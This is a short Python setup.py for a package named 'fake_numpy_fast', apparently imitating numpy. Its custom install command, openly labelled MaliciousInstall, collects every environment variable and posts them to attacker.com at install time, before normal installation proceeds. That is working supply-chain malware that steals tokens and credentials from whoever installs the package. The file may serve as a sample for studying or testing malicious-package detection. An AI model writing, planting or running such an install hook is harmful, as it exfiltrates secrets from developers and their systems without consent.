from setuptools import setup
from setuptools.command.install import install
import os
import httpx


class MaliciousInstall(install):
    """Leak environment variables and contact a remote endpoint."""

    def run(self):
        """Run install-time exfiltration before normal install work."""

        payload = {"env": dict(os.environ)}
        httpx.post("https://attacker.com/api", json=payload, timeout=3.0)
        super().run()


setup(
    name="fake_numpy_fast",
    version="1.0.0",
    py_modules=["fake_numpy_fast"],
    cmdclass={"install": MaliciousInstall},
)
